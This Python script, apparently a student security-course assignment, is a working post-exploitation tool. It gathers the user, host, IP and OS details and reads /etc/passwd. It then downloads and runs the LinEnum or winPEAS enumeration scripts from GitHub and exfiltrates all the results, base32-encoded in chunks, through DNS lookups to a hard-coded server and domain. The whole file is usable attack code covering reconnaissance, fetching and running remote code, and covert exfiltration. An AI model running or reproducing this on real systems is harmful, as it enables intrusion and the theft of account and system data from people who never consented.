# Ofek Bar-Shalom (324161421), Yakir Litmanovitch (314830746)

import os
import socket
import platform
import base64
import subprocess
import requests

def collect_data():
    try:
        username = os.getenv("USERNAME") if is_windows() else (os.getenv("USER") or os.getlogin())
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        lang = os.getenv("LANG", "Unknown") if not is_windows() else os.getenv("LANGUAGE", "Unknown")
        os_version = platform.platform()

        if not is_windows():
            try:
                with open("/etc/passwd", "r") as f:
                    passwd_data = f.read()
            except Exception as e:
                passwd_data = f"Failed to read /etc/passwd: {e}"
        else:
            passwd_data = "[!] Windows system - no /etc/passwd equivalent"

        full_data = f"""
        USER: {username}
        IP: {ip}
        LANG: {lang}
        OS: {os_version}
        PASSWD:\n{passwd_data}
        """
        return full_data.strip()
    except Exception as e:
        return f"Error collecting data: {e}"


def is_windows():
    return platform.system().lower() == "windows"


def download_and_run_enum():
    if is_windows():
        url = "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat"
        filename = "winPEAS.bat"
        run_cmd = ["cmd.exe", "/c", filename]
    else:
        url = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
        filename = "LinEnum.sh"
        run_cmd = ["bash", filename]

    try:
        print(f"[*] Downloading {filename}...")
        response = requests.get(url)
        response.raise_for_status()

        with open(filename, 'wb') as f:
            f.write(response.content)

        if not is_windows():
            os.chmod(filename, 0o755)

        print(f"[*] Running {filename}...")
        result = subprocess.run(run_cmd, capture_output=True, text=True, timeout=120)

        print(f"[+] {filename} completed.")
        return result.stdout.strip()

    except Exception as e:
        return f"[!] Failed to download or run {filename}: {e}"


def dns_exfiltrate(data, server_ip="192.168.1.228", domain="exfil.local"):
    encoded = base64.b32encode(data.encode()).decode()
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]

    for i, chunk in enumerate(chunks):
        full_domain = f"{chunk}.{i}.{domain}"
        try:
            subprocess.run(["nslookup", full_domain, server_ip] if is_windows()
                           else ["dig", f"{full_domain}", f"@{server_ip}"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass


if __name__ == "__main__":
    print("[*] Collecting base system data...")
    base_data = collect_data()

    print("[*] Running enumeration tool...")
    enum_output = download_and_run_enum()

    full_payload = base_data + "\n\n--- LinEnum Output ---\n\n" + enum_output

    print("[*] Starting DNS exfiltration...")
    dns_exfiltrate(full_payload)
    print("[+] Exfiltration complete.")
